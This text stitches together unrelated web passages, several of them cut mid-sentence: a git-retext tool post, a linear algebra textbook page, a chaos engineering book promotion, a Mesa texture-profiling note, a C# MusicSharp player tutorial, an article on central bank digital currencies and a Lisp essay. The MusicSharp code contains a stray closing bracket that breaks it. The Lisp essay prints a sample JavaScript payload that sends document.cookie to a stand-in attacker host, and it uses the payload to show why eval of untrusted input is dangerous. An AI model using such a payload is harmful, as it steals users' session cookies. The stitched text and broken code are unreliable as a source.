where the result of a command is the rewritten tree. Obviously not
quite suitable for easy 'final touches'.</li>
<li>Editor environment features. In Emacs, <a href="https://magit.vc/">Magit</a>, and in
Vim, <a href="https://github.com/jreybert/vimagit">Vimagit</a>, and possibly other editors
have their own Git integrations, some are elaborate enough to ease on editing
the history. However, to each his own, and belaboring on a certain editor
environment would get us off-topic.</li>
</ul>
<h2 id="a-new-way-git-retext">A new way - <code>git-retext</code></h2>
<p>In the process of reviewing, we are most likely looking at diffs. What if it
was possible in an environment-independent way, to just edit the diff? </p>
<p>In the pre-cursor to the invention of Git, developers used emails (and some are
still using emails) in order to pass along changes to one another. The <code>git format-patch</code> command knows how to turn a list of commits into such emails. As
plain text emails can be easily edited by a text editor, it stands to reason
that we can edit changes in-place, if we momentarily turn commits into emails
and back.</p>
<p>This is what <code>git-retext</code> essentially lets you do.</p>
<p>For example, we want to edit the most recent commit in the history. Let's issue
the command:</p>

<p>This <code>git-retext</code> command turns the <code>HEAD~1..HEAD</code> range into emails and we
immediately find ourselves thrown into editing in the default text editor that
we configured, either in Git's configuration, or <code>EDITOR</code> environment variable.
The "thrown into editor" situation should not be foreign to Git users, as it is
done in the default <code>git commit</code> or <code>git rebase -i</code> workflows.</p>
<p>Here's an example for such <code>git-retext HEAD~1</code> invocation at one of my
repositories:</p>

<p>This is how a commit looks like when it is sent by email. It is possible to
edit the first line of the commit in the <code>Subject: </code> ; and the details of the
commit message before the <code>---</code>, and the diff itself. About the diff, we don't
have to fix the unidiff's meta-data, because <code>git-retext</code>'s processing will
take care of it instead.</p>
<p>Saving the temporary and exiting, <code>git-retext</code> will try to apply the edited
commits using <code>git am</code>. If we have carefully edited them, they should
apply cleanly. The resultant <code>HEAD</code> is the edited history.</p>
<p>Of course, this new method is not perfect, but it's a time saver for certain
set of editing activities. After getting accustomed to it, you may start
reviewing changes in <code>git-retext</code> even if you are not ending up modifying them,
instead of running <code>git-diff</code> or viewing a diff made by the editor environment.</p>
<h2 id="advantages">Advantages</h2>
<ul>
<li>Easy to amend changes right when they are being reviewed, as long as
the editing is not too complicated. Adding new diff lines inside hunks
is possible.</li>
<li>Easy to do search and replace on the changes themselves, and that also takes
care of the commit message, and added filenames if relevant.</li>
<li>It is possible to remove unwanted diff hunks.</li>
<li>Splitting of commits to small new commits is possible by adding a new email
header in between hunks (no need to edit the diffstat).</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<ul>
<li>If there is more than one commit and they are dependent on one another, we
must be more careful so that the editing is consistent, and that the diff hunk
context is correct.</li>
<li>It's easy to mess up the editing and discover the mess only when <code>git-retext</code>
fails to apply the changes.</li>
</ul>
<p>Future enhancements of <code>git-retext</code> should assist in avoiding mistakes during
editing, perhaps with better editor integration.</p>

<p><code>git-retext</code> is Python 3 script that relies on <code>recountdiff</code> in order to fix
the edited diffs. The underlying git commands being used are
<code>git-format-patch</code>, <code>git-am</code>, and <code>git-reset</code>.</p>

	  <a href="http://joshua.smcvt.edu/linearalgebra/book.pdf"><i>Linear Algebra</i></a> by Jim Hefferon,
	  along with its 
	  <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">answers to exercises</a>, 
	  is a text for a first undergraduate course.
	  It is Free.
	  Use it as the main book, as a supplement, or for independent study.
	</p>

	<h3>
	  Highlights
	</h3>
	
	<ul>
	  <li><span>Standard coverage</span>
            Linear systems and Gauss's method, 
	    vector spaces, linear maps and matrices, determinants,
	    and eigenvectors and eigenvalues.
          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>
	    Used in hundreds of classes at many schools, 
            as well as by thousands of people

	  <li><span>Applications</span>
            Each chapter finishes with four or five short  
	    supplemental topics
            for reading or projects, or for
            small group work.

<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free. As a company, we believe the concepts explored within have the potential to completely change for the better how people build, operate, and maintain systems at scale. To get your free copy, go to <a href="https://www.verica.io/book/">verica.io/book</a>.</p>

								“A new practice is emerging that builds on the advantages established by CI/CD.
								Continuous Verification (CV) often manifests as a stage in a pipeline, but it can
								also run independently during business hours, verifying assumptions about the
								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”
							</p>
						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.

	One of the big determinants of OpenGL performance is texture
	usage; if an application starts using more textures than fit
	into the graphics card memory, performance can drop
	dramatically.
      </p>
      <p>
	texturetop is something I cooked up to allow easily getting a
	view of the texture usage of a client using the open-source
	Mesa/DRI implementation of libGL. It consists of two pieces;
	a patch for Mesa that provides a generic texture profiling
	hook and a small text mode client along the lines of the
	classic 'top' that uses the profiling hook.
      </p>
      <p>
	The way that the texture profiling hook works is that if an
	environment variable LIBGL_PROFILE_SERVER is set, a separate
	thread is created that connects to the specified profiling
	server and waits for commands for the server. The only command
	at the current time (other than startup/shutdown) is a request
	for changes to the current state since the last update.
      </p>
      <p>
	Some small driver modifications are needed to hook up to this
	profiling infrastructure. In the current version of the patch,
	only the Savage driver is modified, so it probably won't
	do anything for your video card without a little work.
      </p>
      <p>
	The information that texturetop displays is:
      </p>
      <ul>
	<li>Number and size of available texture heaps (Card, AGP,
	etc.)</li>
	<li>For each texture
	  <ul>
	    <li>Width and height of the texture</li>
	    <li>Bytes used in main client memory</li>
	    <li>Current heap for the texture, if any</li>
	    <li>Time texture has been in that heap</li>
	    <li>Bytes used in that heap</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" width="366" height="302" alt="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" width="750" height="402" alt="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" width="750" height="446" alt="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" width="750" height="446" alt="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" width="750" height="473" alt="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>Central banks have overseen monetary policy for much of the last century. During that time, competition was scarce and innovation was slow.</p><p>But in the last decade, a three-pronged attack on the status quo has forced central banks to re-think their strategy.</p><p>It started when Bitcoin bypassed the entire global financial system with a digital, trustless payment network. It gave anyone the power to store, send and receive money across scale, space, and time.</p><p>Then, crypto stablecoins emerged as digital versions of fiat money on new payment rails, giving anyone with an internet connection access to their fiat currency of choice with no borders or transaction limits.</p><p>And in the last decade, a wave of digital-first financial apps like WeChat and Cash App have started to eat away at banking oligopolies, raising the bar for what people expect from their financial institutions.</p><p>In short, the entire global money supply chain is being disrupted, and nothing is exempt.</p><p>Not central banks, not local bank branches, not even the cash in your pocket.</p><p>In response, every segment of the traditional financial system is adapting. Banks are moving operations online and closing branches, merchants are improving online and in-person payment options, and central banks are studying digital currencies.</p><p>In this article we'll cover:</p><ul role="list"><li>What Central Bank Digital Currencies (CBDCs) are</li><li>Which countries are working on CBDCs</li><li>Why digital currencies are important tools for central banks</li><li>The impact CBDCs may have on commercial banks and physical cash</li><li>The challenges central banks need to overcome to implement a CBDC</li></ul><h2>What are Central Bank Digital Currencies?</h2><p>Central Bank Digital Currencies (CBDCs) are a digital extension of the cash in your pocket. There are a few important differences between CBDCs and cash, but 'digital cash' is a good starting point.</p><p>To understand what might make a 'digital cash' useful, let's start with the features that make cash useful. Because for decades, people all over the world have chosen cash as their preferred tool for buying and selling all sorts of goods and services. Why?</p><p>Cash has a few characteristics that make everyday payments possible:</p><ul role="list"><li>Everyone accepts it</li><li>It is hard to counterfeit</li><li>It can be exchanged directly (without involving a bank, payment processor, or government)</li><li>Settlement is instant and final (when I give you cash, all of it instantly becomes yours)</li><li>There are no minimum or maximum purchase amounts and no withholding periods</li></ul><p>But in addition to the features above, cash also has downsides for people and governments.</p><p>For people:</p><ul role="list"><li>It can't be spent online</li><li>It's awkward to store and manage coins and bills of all shapes and sizes</li><li>It's dirty (an especially significant concern thanks to COVID)</li><li>Holding large amounts of cash requires extra security</li></ul><p>For governments:</p><ul role="list"><li>It hides transactions and makes it hard to track down illegal purchases</li><li>It makes it harder to correctly account for and collect taxes</li><li>It's not an effective way to move large sums of money</li><li>It's not an effective way to send (or receive) money to (or from) millions of citizens</li></ul><p>Some of the disadvantages of cash can be easily solved with credit cards and wire transfers, but those are specialized (and expensive) financial tools with their own sets of problems. That's not the point of a CBDC.</p><p>At a high level, central bankers know that cash usage is declining, but they also know how important it is to a functioning economy. So they're trying to build a stable and versatile digital currency that is just as accessible as cash, without the physical constraints of coins and bills.</p><h2>Who is Working on CBDCs?</h2><p>A handful of central banks have already started working on CBDCs.</p><p>China was the first to act, possibly motivated by the prospect of achieving 'global reserve' currency status.</p><p>By launching a 'digital yuan' CBDC before the US launches a 'digital dollar' CBDC, China may be hoping to get other countries to trade in Yuan-denominated digital currency, rather than dollar-denominated money on traditional payment rails.</p><p>For a US economy that accounts for just 23% of global GDP, <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">61% of all foreign bank reserves</a> are currently denominated in U.S. dollars, and <a href="https://www.investopedia.com/articles/forex-currencies/092316/how-us-dollar-became-worlds-reserve-currency.asp#:~:text=Present%20Day-,Today%2C%20more%20than%2061%25%20of%20all%20foreign%20bank%20reserves%20are,debt%20is%20denominated%20in%20dollars.">40% of the world's debt</a> is denominated in dollars.</p><p>This 'dollarization of the world' has given America access to a massive pool of buyers for their debt, at lower rates than would be possible without being a 'reserve currency'.</p><p>Not an advantage the US wants to give up.</p><p>In 2015, The US Federal Reserve initially dismissed the idea of a digital currency, but has since changed their tune. They are actively researching the idea of a digital currency, along with a handful of other central banks around the world.</p><p>Below is a list of central banks that have made public statements about digital currencies, and the progress they've made so far.</p><h3>China</h3><ul role="list"><li><a

central banks released a paper titled <a href="https://www.bis.org/publ/othp33.pdf">'Central bank digital currencies: foundational principles and core features'</a>.</p><p>So far, it's the most complete CBDC plan central banks have released, and it's a common framework that they all worked together on.</p><p>Participants included the Bank of Canada, the ECB, the Bank of Japan, the Swedish Central Bank, the Swiss National Bank, the Bank of England, and the US Federal Reserve. It's worth noting that China did not collaborate on this report, and seems to be content building their own system.</p><p>The report above explains why central banks are studying digital currencies, and what a central bank digital currency might look like if it were to be implemented. It also emphasizes that none of the seven central banks are ready to implement a CBDC yet.</p><p>Below are some of the motivations, potential use cases, and challenges that were highlighted in the CBDC report.</p><h3>Opportunities for Central Bank Digital Currencies</h3><ul role="list"><li>Decreasing cash usage means some people (often the least wealthy) are left without access to 'risk-free' forms of payment</li><li>A CBDC could become a back-up payment method in extreme situations or remote locations where cash might not be accessible</li><li>A fragmented financial payment system with many competing 'closed-loop' participants (banks, credit cards, payment processors) could limit economic growth, a common CBDC could open up better payments access for all</li><li>A global CBDC framework could radically improve cross-border payments</li><li>Central banks could use a CBDC to instantly send stimulus money directly to citizens and governments could collect on taxes just as easily</li><li>Central banks could pay people interest on their CBDC holdings, just like a regular bank might have <a href="https://www.kevinrooke.com/post/your-bank-account-pays-negative-interest">(before they started paying negative interest rates)</a></li></ul><h3>Challenges for Central Bank Digital Currencies</h3><ul role="list"><li>How can central banks build a currency offering instant payments that is also hard to counterfeit, safe from cyber-attacks, and available at all times (including when the internet goes down)?</li><li>How will central banks make sure that technology-illiterate and low-income earners can onboard themselves to a completely digital system?</li><li>How will central banks convince people to trust a digital payments system that can track all of their transactions?</li><li>How will central banks create or connect an existing digital identity system to be sure that money is being sent to and received from the right people?</li><li>If central banks start paying people interest directly through a CBDC, will people ditch their bank accounts? Could this lead to runs on banks or other financial disruptions?</li><li>Could digital currencies undermine the effectiveness of foreign central bank monetary policy? Ex. If people in Sweden have access to digital dollars (a CBDC denominated in $USD), could Sweden's central bank lose its power to influence monetary …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
